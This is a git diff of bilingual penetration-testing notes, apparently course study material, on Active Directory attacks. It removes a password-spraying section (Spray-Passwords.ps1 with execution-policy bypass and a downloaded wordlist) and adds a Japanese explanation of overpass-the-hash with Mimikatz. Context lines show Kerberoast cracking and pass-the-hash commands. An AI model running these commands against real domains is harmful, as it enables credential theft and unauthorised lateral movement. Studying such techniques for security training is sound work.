@@ -159,34 +159,6 @@ Not using john, but using kerberoast tgsrecrack.py:
 
 ```$ python /kerberoast/tgsrepcrack.py wordlist.txt 1-40a50000- Offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi```
 
-# Active Directory Users Password Attack
-(https://github.com/ZilentJack/Spray-Passwords/blob/master/Spray-Passwords.ps1)
-
-Open the PowerShell, execute on PowerShell.
-
-```PS C> powershell -ep bypass .\Spray-Passwords.ps1 -Pass Qwerty09! -Admin```
-
-
-(1) 
-```PS C:\> .\Spray-Passwords.ps1 -Pass 'Summer2016'```
-
-- Test the password 'Summer2016' against all active user accounts, except privileged user accounts (admincount=1).
-
-(2) ```PS C:\> .\Spray-Passwords.ps1 -Pass 'Summer2016,Password123' -Admins```
-
-- Test the password 'Summer2016' against all active user accounts, including privileged user accounts (admincount=1).
-
-(3) ```PS C:\> .\Spray-Passwords.ps1 -File .\passwords.txt -Verbose```
-
-- Test each password in the file 'passwords.txt' against all active user accounts, except privileged user accounts (admincount=1).
-- Output script progress/status information to console.
-
-(4) ```PS C:\> .\Spray-Passwords.ps1 -Url 'https://raw.githubusercontent.com/ZilentJack/Get-bADpasswords/master/BadPasswords.txt' -Verbose```
-
-- Download the password file with weak passwords.
-- Test each password against all active user accounts, except privileged user accounts (admincount=1).
-- Output script progress/status information to console.
-
 # Kerberos認証
 ## AS_REQ
 - タイムスタンプ
@@ -214,7 +186,7 @@ Open the PowerShell, execute on PowerShell.
 
 
 
-# Lateral Movement~
+# Lateral Movement
 ## Pass The Hash
 c.f.) https://book.hacktricks.xyz/pentesting/pentesting-smb
 
@@ -232,7 +204,9 @@ pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2
 
 ## Over Pass The Hash
 
-> overpass the hash テクニックの本質は、NTLM ハッシュを Kerberos チケットに変換し、 NTLM 認証を回避することにあります。これを行なう簡単な方法は、やはり Mimikatz の sekurlsa::pth コマンドです。
+Overpass the hash673とは、NTLM のユーザハッシュを「オーバー」悪用して、完全な Kerberos の Ticket Granting Ticket(TGT)やサービスチケットを獲得することであり、これにより、 そのユーザとして別のマシンやサービスにアクセスすることが可能となります。
+
+overpass the hash テクニックの本質は、NTLM ハッシュを Kerberos チケットに変換し、 NTLM 認証を回避することにあります。これを行なう簡単な方法は、やはり Mimikatz の sekurlsa::pth コマンドです。
 
 Converting NTLM hash to TGT and get another user's shell. 
 
